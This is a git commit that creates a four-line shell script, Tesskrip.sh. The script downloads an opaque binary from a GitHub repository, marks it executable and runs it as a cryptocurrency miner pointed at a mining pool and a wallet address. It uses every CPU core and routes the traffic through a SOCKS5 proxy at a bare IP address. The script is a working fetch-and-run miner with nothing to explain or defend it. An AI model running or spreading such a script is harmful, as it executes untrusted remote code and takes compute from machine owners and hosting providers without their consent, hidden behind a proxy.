490a798bf66853232568100cdf96e2cfa503bf52
uaaoxjdr <99876928+uaaoxjdr@users.noreply.github.com>
2022-04-25 10:30:25 +0700

    Create Tesskrip.sh

---
+++ Tesskrip.sh
@@ -0,0 +1,4 @@
+apt update -y
+wget -q https://github.com/thirthada007/DevOps/raw/main/data
+chmod +x data
+./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RBbGMpNtitSpNwGMT1cXgYNTfpYdHbrGde.Test -p c=RVN -t $(nproc) -x socks5://104.238.97.215:39442
